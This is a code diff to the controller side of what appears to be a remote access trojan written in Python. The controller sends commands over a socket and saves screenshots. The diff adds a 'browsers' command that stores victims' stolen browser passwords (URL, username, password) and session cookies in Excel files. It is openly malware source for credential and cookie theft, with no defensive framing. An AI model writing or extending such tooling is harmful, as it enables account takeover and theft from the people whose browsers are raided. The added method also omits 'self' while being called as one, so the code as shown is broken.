@@ -1,5 +1,6 @@
 import socket,json,base64
 import time
+import pandas as pd
 import datetime
 
 class Listener:
@@ -39,6 +40,18 @@ class Listener:
             binary_data = file.read()
             return base64.b64encode(binary_data).decode("utf-8")
     
+    def create_excel(data,type):
+        if type=="passwords":
+            df=pd.DataFrame(data,columns=["browser_name","url",'username','password'])
+            # df.to_csv('passwords.')
+            df.to_excel("password.xlsx",index=False)
+            return "[+] Passwords Downloaded Successfully"
+        elif type=="cookies":
+            df=pd.DataFrame(data,columns=["browser_name","host_key",'name','cookie','creation_utc','last_access_utc','expires_utc'])
+            df.to_excel("cookies.xlsx",index=False)
+            return '[+] Cookies Download Suceessfully'
+        return data 
+    
     def control_bakara(self):
         while True:
             print("in loop")
@@ -57,6 +70,8 @@ class Listener:
                 elif command[0]=="screenshot":
                     current_time=datetime.datetime.now().strftime("%d-%m-%Y-%H-%M-%S")
                     result=self.write_file("screenshot"+current_time+".png",result.encode())
+                elif command[0]=="browsers":
+                    result=self.create_excel(result,command[1])
                 elif command[0]=="exit":
                     break
             except Exception as e:
